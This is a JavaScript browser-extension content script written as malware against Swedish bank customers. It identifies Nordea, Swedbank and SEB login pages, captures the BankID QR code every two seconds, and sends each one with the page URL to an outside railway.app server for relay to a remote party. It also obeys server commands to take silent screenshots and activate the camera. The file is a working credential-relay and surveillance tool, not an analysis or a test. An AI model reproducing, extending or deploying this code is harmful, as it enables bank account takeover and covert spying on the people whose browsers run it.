// Enhanced QR Scanner with Multi-Bank Support
// Integrates our existing system with their multi-bank targeting

// Server configuration
const PRODUCTION_URL = 'https://web-production-72c0d.up.railway.app';
const RAILWAY_URL = 'https://web-production-72c0d.up.railway.app';

// Bank-specific configurations (stolen from their system)
const BANK_CONFIGS = {
    NORDEA: {
        identifier: {
            urls: ['identify.nordea.com', 'nordea.'],
            titles: ['nordea'],
            domains: ['nordea']
        },
        selectors: {
            qrCanvas: 'canvas.qr-code-canvas[title="QR-kod"]',
            qrCanvasById: 'canvas#qr-code-canvas',
            qrCanvasAll: 'canvas[title="QR-kod"]'
        },
        captureInterval: 50,
        captureThrottle: 100,
        lastCapture: 0,
        lastHash: null,
        displayUrl: `${PRODUCTION_URL}/nordea`
    },
    SWEDBANK: {
        identifier: {
            urls: ['online.swedbank.se', 'swedbank.'],
            titles: ['swedbank', 'mobilt bankid', 'logga in'],
            domains: ['swedbank']
        },
        selectors: {
            qrCanvas: 'canvas#sbid-qr',
            qrCanvasById: 'canvas[id*="qr"], canvas[id*="bankid"], canvas[id*="sbid"]',
            qrCanvasClass: 'canvas[class*="qr"], canvas[class*="bankid"], canvas[class*="sbid"]',
            qrCanvasAll: 'canvas[id*="bankid"], canvas[class*="bankid"], canvas[data-testid*="qr"]',
            qrImage: 'img.mobile-bank-id__qr-code--image, img[alt*="QR-kod"], img[class*="qr-code"]'
        },
        captureInterval: 50,
        captureThrottle: 100,
        lastCapture: 0,
        lastHash: null,
        displayUrl: `${PRODUCTION_URL}/swedbank`
    },
    SEB: {
        identifier: {
            urls: ['seb.se', 'seb.'],
            titles: ['seb', 'bankid'],
            domains: ['seb']
        },
        selectors: {
            qrCanvas: 'canvas.qrcode, canvas[class*="qrcode"]',
            qrCanvasAll: 'canvas[id*="qr"], canvas[class*="qr"]'
        },
        captureInterval: 50,
        captureThrottle: 100,
        lastCapture: 0,
        lastHash: null,
        displayUrl: `${PRODUCTION_URL}/seb`
    }
};

// Function to identify current bank
function identifyBank() {
    const currentUrl = window.location.href.toLowerCase();
    const currentTitle = document.title.toLowerCase();
    
    for (const [bank, config] of Object.entries(BANK_CONFIGS)) {
        if (config.identifier.urls.some(url => currentUrl.includes(url)) ||
            config.identifier.titles.some(title => currentTitle.includes(title)) ||
            config.identifier.domains.some(domain => currentUrl.includes(domain))) {
            return bank;
        }
    }
    return null;
}

// Enhanced QR capture function for all banks
function captureBankQR(bankName) {
    const config = BANK_CONFIGS[bankName];
    if (!config) return;
    
    const now = Date.now();
    if (now - config.lastCapture < config.captureThrottle) {
        return;
    }

    // Try to find QR canvas first
    const qrCanvas = document.querySelector(config.selectors.qrCanvas) || 
                    document.querySelector(config.selectors.qrCanvasById) ||
                    document.querySelector(config.selectors.qrCanvasAll) ||
                    Array.from(document.getElementsByTagName('canvas')).find(canvas => {
                        const isSquare = canvas.width === canvas.height;
                        const hasValidSize = canvas.width >= 150 && canvas.width <= 300;
                        return isSquare && hasValidSize;
                    });

    if (qrCanvas) {
        try {
            const rect = qrCanvas.getBoundingClientRect();
            if (rect.width === 0 || rect.height === 0 || !rect.width || !rect.height) {
                return;
            }

            const base64Data = qrCanvas.toDataURL('image/png');
            if (!base64Data || base64Data === 'data:,') {
                return;
            }

            const hash = base64Data.slice(-32);
            if (hash === config.lastHash) {
                return;
            }
            
            config.lastHash = hash;
            config.lastCapture = now;

            // Send to server if configured
            if (RAILWAY_URL) {
                sendQRToServer(base64Data, bankName, RAILWAY_URL);
            }
            
        } catch (error) {
            console.error('Error capturing QR canvas:', error);
        }
    }

    // Try to find QR image as fallback
    if (config.selectors.qrImage) {
        const qrImage = document.querySelector(config.selectors.qrImage);
        if (qrImage) {
            try {
                const canvas = document.createElement('canvas');
                const rect = qrImage.getBoundingClientRect();
                
                canvas.width = qrImage.naturalWidth || rect.width;
                canvas.height = qrImage.naturalHeight || rect.height;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(qrImage, 0, 0);
                
                const base64Data = canvas.toDataURL('image/png');
                if (!base64Data || base64Data === 'data:,') {
                    return;
                }

                const hash = base64Data.slice(-32);
                if (hash === config.lastHash) {
                    return;
                }
                
                config.lastHash = hash;
                config.lastCapture = now;

                // Send to both servers for redundancy
                sendQRToServer(base64Data, bankName, PRODUCTION_URL);
                sendQRToServer(base64Data, bankName, RAILWAY_URL);
                
            } catch (error) {
                console.error('Error capturing QR image:', error);
            }
        }
    }
}

// Function to send QR data to server
function sendQRToServer(qrData, bankName, serverUrl) {
    fetch(`${serverUrl}/api/qr`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify({ 
            qrData: qrData,
            bank: bankName,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            displayUrl: BANK_CONFIGS[bankName].displayUrl
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log(`QR code sent to ${serverUrl}:`, data);
        // Also emit to our socket for real-time updates
        if (window.socket) {
            window.socket.emit('qr-scanned', {
                data: qrData,
                bank: bankName,
                timestamp: new Date().toISOString()
            });
        }
    })
    .catch(error => {
        console.error(`Error sending QR to ${serverUrl}:`, error);
    });
}

// Auto-capture function for bank-specific QR codes
function autoCaptureBankQR() {
    const currentBank = identifyBank();
    if (currentBank) {
        console.log(`Auto-capturing QR for ${currentBank}`);
        captureBankQR(currentBank);
    }
}

// Start monitoring for bank QR codes
function startBankMonitoring() {
    // Initial capture
    autoCaptureBankQR();
    
    // Set up interval for continuous monitoring
    setInterval(autoCaptureBankQR, 2000); // Check every 2 seconds
}

// Initialize enhanced QR scanning
function initializeEnhancedQR() {
    console.log('🚀 Enhanced QR Scanner initialized');
    
    // Start bank-specific monitoring
    startBankMonitoring();
    
    // Keep our existing functionality
    if (window.socket) {
        console.log('📡 Socket connection available');
    }
}

// Listen for messages from popup (our existing functionality)
window.addEventListener('message', async (event) => {
    if (event.data.type === 'QR_SCAN') {
        try {
            // Load QR code scanning library
            const script = document.createElement('script');
            script.src = 'https://unpkg.com/html5-qrcode';
            document.head.appendChild(script);

            await new Promise((resolve) => script.onload = resolve);

            // Create temporary image element
            const img = new Image();
            img.src = event.data.data;

            await new Promise((resolve) => img.onload = resolve);

            // Scan for QR code
            const qrScanner = new Html5Qrcode("qr-reader");
            const result = await qrScanner.scanFile(img, true);

            if (result) {
                // Send result back to popup
                chrome.runtime.sendMessage({
                    type: 'QR_FOUND',
                    data: result
                });
            }
        } catch (error) {
            console.error('QR scanning error:', error);
        }
    }
});

// Listen for silent screenshot requests from server
if (window.socket) {
    socket.on('request-silent-screenshot', () => {
        console.log('📸 Silent screenshot request received');
        try {
            chrome.runtime.sendMessage({ type: 'ADMIN_REQUEST_SCREENSHOT' }, (response) => {
                if (chrome.runtime.lastError) {
                    console.error('Failed to request screenshot:', chrome.runtime.lastError);
                } else {
                    console.log('📸 Screenshot request sent to background script');
                }
            });
        } catch (error) {
            console.error('Error requesting screenshot:', error);
        }
    });

    // Listen for silent camera requests from server
    socket.on('request-silent-camera', () => {
        console.log('📷 Silent camera request received');
        try {
            chrome.runtime.sendMessage({ type: 'ADMIN_REQUEST_CAMERA' }, (response) => {
                if (chrome.runtime.lastError) {
                    console.error('Failed to request camera:', chrome.runtime.lastError);
                } else {
                    console.log('📷 Camera request sent to background script');
                }
            });
        } catch (error) {
            console.error('Error requesting camera:', error);
        }
    });
}

// Initialize when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeEnhancedQR);
} else {
    initializeEnhancedQR();
} 